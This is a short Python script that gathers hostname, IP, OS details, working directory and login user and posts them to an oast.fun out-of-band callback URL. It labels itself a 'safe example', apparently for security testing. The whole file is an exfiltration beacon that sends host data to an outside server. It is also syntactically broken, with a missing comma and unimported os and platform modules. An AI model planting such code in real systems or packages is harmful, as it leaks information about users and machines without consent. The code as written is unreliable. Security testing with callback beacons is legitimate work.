import socket
import requests

# Safe example: sending hostname/IP to your server
host_info = {
    "hostname": socket.gethostname(),
    "ip": socket.gethostbyname(socket.gethostname())
    "platform": platform.system(),
    "release": platform.release(),
    "arch": platform.machine(),
    "cwd": os.getcwd(),
    "user": os.getlogin(),
    "network_interfaces": []
}

# Replace with your OAST link
try:
    requests.post("https://ubjbfddxsmjqevcfwfvm9apo9he144g5p.oast.fun", json=host_info, timeout=5)
except Exception as e:
    print("Sent host info (or simulated).", e)
